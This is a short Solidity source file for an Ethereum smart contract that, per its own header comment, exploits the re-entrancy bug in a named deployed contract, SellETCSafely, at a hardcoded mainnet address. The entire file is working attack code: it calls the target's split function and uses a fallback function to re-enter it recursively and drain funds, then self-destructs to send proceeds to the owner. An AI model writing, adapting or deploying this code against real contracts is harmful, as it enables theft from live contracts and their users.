pragma solidity ^0.4.19;

/*
    This contract was written to exploit the SellETCSafely contract using its re-entrancy bug.
    See: https://etherscan.io/address/0x5F0d0C4c159970fDa5ADc93a6b7F17706fd3255C.
*/

contract TargetContract {
    function split(address ethDestination, address etcDestination) payable public;
}

contract Exploit {
    address public owner;
    TargetContract targetContract = TargetContract(0x5F0d0C4c159970fDa5ADc93a6b7F17706fd3255C);
    
    function Exploit() public {
        owner = msg.sender;
    }
    
    function performReentrancyAttack() payable public {
        // Perform a re-entrancy attack on the target contract.
        
        // We'll need at least a tenth of the target contact's balance to ensure that the recursion doesn't use up too much gas.
        require(msg.value >= 0.1 ether);
        
        // Initiate the re-rentrancy.
        targetContract.split.value(1)(msg.sender, msg.sender);
    }
    
    function () payable public {
        performReentrancyAttack();
    }
    
    function kill() public {
        // After using the contract, we'll destroy it.
        require(owner == msg.sender);
        selfdestruct(owner);
    }
}